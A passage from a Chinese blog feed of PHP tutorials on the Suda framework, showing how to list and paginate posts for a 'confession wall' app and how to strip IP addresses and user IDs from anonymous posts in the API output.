class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"user"</span>: &#123;</span><br><span class="line">                    <span class="attr">"id"</span>: <span class="string">"1"</span>,</span><br><span class="line">                    <span class="attr">"name"</span>: <span class="string">"dxkite"</span>,</span><br><span class="line">                    <span class="attr">"avatar"</span>: <span class="string">"0"</span>,</span><br><span class="line">                    <span class="attr">"signupTime"</span>: <span class="string">"1535032260"</span>,</span><br><span class="line">                    <span class="attr">"avatarUrl"</span>: <span class="string">"http://confession-wall.dxkite.org/dev.php/user/avatar/1"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"anonymous"</span>: <span class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"title"</span>: <span class="string">"DXkite"</span>,</span><br><span class="line">                <span class="attr">"content"</span>: &#123;</span><br><span class="line">                    <span class="attr">"type"</span>: <span class="string">"markdown"</span>,</span><br><span class="line">                    <span class="attr">"raw"</span>: <span class="string">"DXkite Content"</span>,</span><br><span class="line">                    <span class="attr">"html"</span>: <span class="string">"&lt;p&gt;DXkite Content&lt;/p&gt;"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"time"</span>: <span class="string">"1535032422"</span>,</span><br><span class="line">                <span class="attr">"ip"</span>: <span class="string">"127.0.0.1"</span>,</span><br><span class="line">                <span class="attr">"status"</span>: <span class="string">"1"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"id"</span>: <span class="string">"2"</span>,</span><br><span class="line">                <span class="attr">"user"</span>: &#123;</span><br><span class="line">                    <span class="attr">"id"</span>: <span class="string">"1"</span>,</span><br><span class="line">                    <span class="attr">"name"</span>: <span class="string">"dxkite"</span>,</span><br><span class="line">                    <span class="attr">"avatar"</span>: <span class="string">"0"</span>,</span><br><span class="line">                    <span class="attr">"signupTime"</span>: <span class="string">"1535032260"</span>,</span><br><span class="line">                    <span class="attr">"avatarUrl"</span>: <span class="string">"http://confession-wall.dxkite.org/dev.php/user/avatar/1"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"anonymous"</span>: <span class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"title"</span>: <span class="string">"这是我的表白"</span>,</span><br><span class="line">                <span class="attr">"content"</span>: &#123;</span><br><span class="line">                    <span class="attr">"type"</span>: <span class="string">"markdown"</span>,</span><br><span class="line">                    <span class="attr">"raw"</span>: <span class="string">"匿名状态发布 "</span>,</span><br><span class="line">                    <span class="attr">"html"</span>: <span class="string">"&lt;p&gt;匿名状态发布&lt;/p&gt;"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"time"</span>: <span class="string">"1535032846"</span>,</span><br><span class="line">                <span class="attr">"ip"</span>: <span class="string">"127.0.0.1"</span>,</span><br><span class="line">                <span class="attr">"status"</span>: <span class="string">"1"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"id"</span>: <span class="string">"3"</span>,</span><br><span class="line">                <span class="attr">"user"</span>: &#123;</span><br><span class="line">                    <span class="attr">"id"</span>: <span class="string">"1"</span>,</span><br><span class="line">                    <span class="attr">"name"</span>: <span class="string">"dxkite"</span>,</span><br><span class="line">                    <span class="attr">"avatar"</span>: <span class="string">"0"</span>,</span><br><span class="line">                    <span class="attr">"signupTime"</span>: <span class="string">"1535032260"</span>,</span><br><span class="line">                    <span class="attr">"avatarUrl"</span>: <span class="string">"http://confession-wall.dxkite.org/dev.php/user/avatar/1"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"anonymous"</span>: <span class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"title"</span>: <span class="string">"标题"</span>,</span><br><span class="line">                <span class="attr">"content"</span>: &#123;</span><br><span class="line">                    <span class="attr">"type"</span>: <span class="string">"markdown"</span>,</span><br><span class="line">                    <span class="attr">"raw"</span>: <span class="string">"内容"</span>,</span><br><span class="line">                    <span class="attr">"html"</span>: <span class="string">"&lt;p&gt;内容&lt;/p&gt;"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"time"</span>: <span class="string">"1535037182"</span>,</span><br><span class="line">                <span class="attr">"ip"</span>: <span class="string">"127.0.0.1"</span>,</span><br><span class="line">                <span class="attr">"status"</span>: <span class="string">"1"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"id"</span>: <span class="string">"4"</span>,</span><br><span class="line">                <span class="attr">"user"</span>: &#123;</span><br><span class="line">                    <span class="attr">"id"</span>: <span class="string">"1"</span>,</span><br><span class="line">                    <span class="attr">"name"</span>: <span class="string">"dxkite"</span>,</span><br><span class="line">                    <span class="attr">"avatar"</span>: <span class="string">"0"</span>,</span><br><span class="line">                    <span class="attr">"signupTime"</span>: <span class="string">"1535032260"</span>,</span><br><span class="line">                    <span class="attr">"avatarUrl"</span>: <span class="string">"http://confession-wall.dxkite.org/dev.php/user/avatar/1"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"anonymous"</span>: <span class="string">"0"</span>,</span><br><span class="line">                <span class="attr">"title"</span>: <span class="string">"不是匿名的表白帖"</span>,</span><br><span class="line">                <span class="attr">"content"</span>: &#123;</span><br><span class="line">                    <span class="attr">"type"</span>: <span class="string">"markdown"</span>,</span><br><span class="line">                    <span class="attr">"raw"</span>: <span class="string">"表白内容"</span>,</span><br><span class="line">                    <span class="attr">"html"</span>: <span class="string">"&lt;p&gt;表白内容&lt;/p&gt;"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"time"</span>: <span class="string">"1535120351"</span>,</span><br><span class="line">                <span class="attr">"ip"</span>: <span class="string">"127.0.0.1"</span>,</span><br><span class="line">                <span class="attr">"status"</span>: <span class="string">"1"</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"row_size"</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="attr">"row_total"</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="attr">"page"</span>: &#123;</span><br><span class="line">            <span class="attr">"max"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"min"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"size"</span>: <span class="number">4</span>,</span><br><span class="line">            <span class="attr">"current"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"next"</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">"previous"</span>: <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"id"</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><p><strong>复现</strong></p><blockquote><p>还有删除啥的明天再说了</p></blockquote>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Suda框架技能使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Suda </tag>
            
            <tag> 表白墙 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Suda - 15 表白墙基本业务操作 - 列出表白</title>
      <link href="/2018/08/24/suda-confession-wall-view-list/"/>
      <url>/2018/08/24/suda-confession-wall-view-list/</url>
      <content type="html"><![CDATA[<p>今天的任务挺简单：获取表白内容列表</p><a id="more"></a><h2 id="套路1"><a href="#套路1" class="headerlink" title="套路1"></a>套路1</h2><p>按照昨天的套路，我们应该是先写HTML页面再说，但是在一个成熟的项目团队中，HTML页面将会由前端人员来写，也就是所谓的前后端分离。</p><p>先创建一个方法 <code>list</code> ，这里我们引用一下 <code>Support</code> 模块的 <code>dxkite\support\view\TablePager</code> 类，这个类的功能是构建一个分页，也就是我们在网页中常见的下一页的功能的实现。基本参数如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 表页信息构建</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TablePager</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 列出指定条件的内容，并进行分页</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Table $table 需要擦好像的表</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> [type] $where 查询条件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $binder 查询条件值绑定</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer|null $page 分页</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer $row 每页书目</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">listWhere</span><span class="params">(Table $table, $where, array $binder, ?int $page, int $row)</span>:<span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br></pre></td></tr></table></figure><p>通过如上的描述，我们的<code>ConfessionController</code>列出函数可以这样写（列出表元素，当状态为：<code>ConfessionTable::STATUS_NORMAL</code> 的时候）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">list</span><span class="params">(?int $page, int $row = <span class="number">10</span>)</span>:?<span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//  列出表元素，当状态为：ConfessionTable::STATUS_NORMAL 的时候</span></span><br><span class="line">    <span class="keyword">return</span> TablePager::listWhere(<span class="keyword">$this</span>-&gt;table, [<span class="string">'status'</span> =&gt; ConfessionTable::STATUS_NORMAL], [], $page, $row);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我们的 <code>ConfessionController</code> 类长这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">confession</span>\<span class="title">wall</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">dxkite</span>\<span class="title">confession</span>\<span class="title">wall</span>\<span class="title">table</span>\<span class="title">ConfessionTable</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">dxkite</span>\<span class="title">support</span>\<span class="title">view</span>\<span class="title">TablePager</span>; <span class="comment">// 引入分页函数类</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理表白</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConfessionController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $table;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;table = <span class="keyword">new</span> ConfessionTable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 添加表白帖</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $title</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> boolean $anonymous</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">(string $title, string $content, bool $anonymous=true)</span>: <span class="title">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;table-&gt;insert([</span><br><span class="line">            <span class="string">'user'</span> =&gt; get_user_id(),</span><br><span class="line">            <span class="string">'title'</span> =&gt; $title ,</span><br><span class="line">            <span class="string">'content'</span> =&gt; $content,</span><br><span class="line">            <span class="string">'anonymous'</span> =&gt; $anonymous ? <span class="number">1</span> :<span class="number">0</span>,</span><br><span class="line">            <span class="string">'time'</span> =&gt; time(),</span><br><span class="line">            <span class="string">'ip'</span> =&gt; request()-&gt;ip(),</span><br><span class="line">            <span class="string">'status'</span> =&gt; ConfessionTable::STATUS_NORMAL,</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">list</span><span class="params">(?int $page, int $row = <span class="number">10</span>)</span>:?<span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//  列出表元素，当状态为：ConfessionTable::STATUS_NORMAL 的时候</span></span><br><span class="line">        <span class="keyword">return</span> TablePager::listWhere(<span class="keyword">$this</span>-&gt;table, [<span class="string">'status'</span> =&gt; ConfessionTable::STATUS_NORMAL], [], $page, $row);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>这可能是我最后一次列出全部代码了，毕竟会造成篇幅太长，我可能后期会弄一个工具用来查看文档</strong></p><p>按照昨天的套路，我们如果要接用<code>support</code>模块公开api的话，还需要添加到provider类（可能有点繁琐，等会就会讲为什么）,添加到昨天的 <code>ConfessionProvider</code> 中去：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">list</span><span class="params">(?int $page, int $row = <span class="number">10</span>)</span>:?<span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;controller-&gt;list($page, $row);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后利用Postman来调用这个方法；</p><p><img src="1.png" alt=""></p><p>可以看到我们的包：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">"method"</span>:<span class="string">"list"</span>,</span><br><span class="line"><span class="attr">"params"</span>: [],</span><br><span class="line"><span class="attr">"id"</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以及返回包：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"rows"</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"id"</span>: <span class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"user"</span>: <span class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"anonymous"</span>: <span class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"title"</span>: <span class="string">"DXkite"</span>,</span><br><span class="line">                <span class="attr">"content"</span>: &#123;</span><br><span class="line">                    <span class="attr">"type"</span>: <span class="string">"markdown"</span>,</span><br><span class="line">                    <span class="attr">"raw"</span>: <span class="string">"DXkite Content"</span>,</span><br><span class="line">                    <span class="attr">"html"</span>: <span class="string">"&lt;p&gt;DXkite Content&lt;/p&gt;"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"time"</span>: <span class="string">"1535032422"</span>,</span><br><span class="line">                <span class="attr">"ip"</span>: <span class="string">"127.0.0.1"</span>,</span><br><span class="line">                <span class="attr">"status"</span>: <span class="string">"1"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"id"</span>: <span class="string">"2"</span>,</span><br><span class="line">                <span class="attr">"user"</span>: <span class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"anonymous"</span>: <span class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"title"</span>: <span class="string">"这是我的表白"</span>,</span><br><span class="line">                <span class="attr">"content"</span>: &#123;</span><br><span class="line">                    <span class="attr">"type"</span>: <span class="string">"markdown"</span>,</span><br><span class="line">                    <span class="attr">"raw"</span>: <span class="string">"匿名状态发布 "</span>,</span><br><span class="line">                    <span class="attr">"html"</span>: <span class="string">"&lt;p&gt;匿名状态发布&lt;/p&gt;"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"time"</span>: <span class="string">"1535032846"</span>,</span><br><span class="line">                <span class="attr">"ip"</span>: <span class="string">"127.0.0.1"</span>,</span><br><span class="line">                <span class="attr">"status"</span>: <span class="string">"1"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"id"</span>: <span class="string">"3"</span>,</span><br><span class="line">                <span class="attr">"user"</span>: <span class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"anonymous"</span>: <span class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"title"</span>: <span class="string">"标题"</span>,</span><br><span class="line">                <span class="attr">"content"</span>: &#123;</span><br><span class="line">                    <span class="attr">"type"</span>: <span class="string">"markdown"</span>,</span><br><span class="line">                    <span class="attr">"raw"</span>: <span class="string">"内容"</span>,</span><br><span class="line">                    <span class="attr">"html"</span>: <span class="string">"&lt;p&gt;内容&lt;/p&gt;"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"time"</span>: <span class="string">"1535037182"</span>,</span><br><span class="line">                <span class="attr">"ip"</span>: <span class="string">"127.0.0.1"</span>,</span><br><span class="line">                <span class="attr">"status"</span>: <span class="string">"1"</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"row_size"</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="attr">"row_total"</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="attr">"page"</span>: &#123;</span><br><span class="line">            <span class="attr">"max"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"min"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"size"</span>: <span class="number">3</span>,</span><br><span class="line">            <span class="attr">"current"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"next"</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">"previous"</span>: <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"id"</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就目前来说，我们构建的包好像没有参数？为什么？因为这个list函数的值都是可省略的。（<code>page</code> 可为null，<code>row</code> 默认为10），在后续的教程中，我们优先开发功能，所以将会先把后端也就是api接口开发完毕后才会开始开发页面。</p><p>从返回包来看，我们的页面信息都存储在里面了，但是也有一个问题，我们的ip啊，user啊都在里面！！如果一个稍微懂技术的人员通过这个接口就可以获取表白人的账号和发帖ip这将很危险，所以，在Controller层获取数据之后我们还要进行一次处理。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">list</span><span class="params">(?int $page, int $row = <span class="number">10</span>)</span>:?<span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $pageData = <span class="keyword">$this</span>-&gt;controller-&gt;list($page, $row);</span><br><span class="line">    $pageRows = $pageData[<span class="string">'rows'</span>]; <span class="comment">// 获取到数据字段</span></span><br><span class="line">    <span class="keyword">foreach</span> ($pageRows <span class="keyword">as</span> $index =&gt; $pageRow ) &#123;</span><br><span class="line">        <span class="comment">// 表示匿名状态</span></span><br><span class="line">        <span class="keyword">if</span> ($pageRow[<span class="string">'anonymous'</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// 清理user的信息</span></span><br><span class="line">            $pageRow[<span class="string">'user'</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 去除IP信息</span></span><br><span class="line">        <span class="keyword">unset</span>($pageRow[<span class="string">'ip'</span>]);</span><br><span class="line">        <span class="comment">// 替换原来的列</span></span><br><span class="line">        $pageRows[$index] = $pageRow;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 放回原来的字段</span></span><br><span class="line">    $pageData[<span class="string">'rows'</span>] = $pageRows;</span><br><span class="line">    <span class="keyword">return</span> $pageData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，我们在Provider层处理输出的数据，并去除了敏感信息；继续请求包，看看我们的返回：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"result"</span>: &#123;</span><br><span class="line">        <span class="attr">"rows"</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"id"</span>: <span class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"user"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"anonymous"</span>: <span class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"title"</span>: <span class="string">"DXkite"</span>,</span><br><span class="line">                <span class="attr">"content"</span>: &#123;</span><br><span class="line">                    <span class="attr">"type"</span>: <span class="string">"markdown"</span>,</span><br><span class="line">                    <span class="attr">"raw"</span>: <span class="string">"DXkite Content"</span>,</span><br><span class="line">                    <span class="attr">"html"</span>: <span class="string">"&lt;p&gt;DXkite Content&lt;/p&gt;"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"time"</span>: <span class="string">"1535032422"</span>,</span><br><span class="line">                <span class="attr">"status"</span>: <span class="string">"1"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"id"</span>: <span class="string">"2"</span>,</span><br><span class="line">                <span class="attr">"user"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"anonymous"</span>: <span class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"title"</span>: <span class="string">"这是我的表白"</span>,</span><br><span class="line">                <span class="attr">"content"</span>: &#123;</span><br><span class="line">                    <span class="attr">"type"</span>: <span class="string">"markdown"</span>,</span><br><span class="line">                    <span class="attr">"raw"</span>: <span class="string">"匿名状态发布 "</span>,</span><br><span class="line">                    <span class="attr">"html"</span>: <span class="string">"&lt;p&gt;匿名状态发布&lt;/p&gt;"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"time"</span>: <span class="string">"1535032846"</span>,</span><br><span class="line">                <span class="attr">"status"</span>: <span class="string">"1"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"id"</span>: <span class="string">"3"</span>,</span><br><span class="line">                <span class="attr">"user"</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="attr">"anonymous"</span>: <span class="string">"1"</span>,</span><br><span class="line">                <span class="attr">"title"</span>: <span class="string">"标题"</span>,</span><br><span class="line">                <span class="attr">"content"</span>: &#123;</span><br><span class="line">                    <span class="attr">"type"</span>: <span class="string">"markdown"</span>,</span><br><span class="line">                    <span class="attr">"raw"</span>: <span class="string">"内容"</span>,</span><br><span class="line">                    <span class="attr">"html"</span>: <span class="string">"&lt;p&gt;内容&lt;/p&gt;"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"time"</span>: <span class="string">"1535037182"</span>,</span><br><span class="line">                <span class="attr">"status"</span>: <span class="string">"1"</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"row_size"</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="attr">"row_total"</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="attr">"page"</span>: &#123;</span><br><span class="line">            <span class="attr">"max"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"min"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"size"</span>: <span class="number">3</span>,</span><br><span class="line">            <span class="attr">"current"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"next"</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">"previous"</span>: <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"id"</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，我们的匿名人发表的信息的ID都为0了，然后所以人的IP也都不见了。（PHP语法请熟练）</p><h3 id="用户信息的具象化"><a href="#用户信息的具象化" class="headerlink" title="用户信息的具象化"></a>用户信息的具象化</h3><p>从刚刚我们的返回包可以看到，用户的数据还停留在id这样一个状态，我们现在需要具象化他，先下载好模块，我这个功能也是刚添加好的</p><ul><li><a href="dxkite-support.8.24.mod">support</a></li><li><a 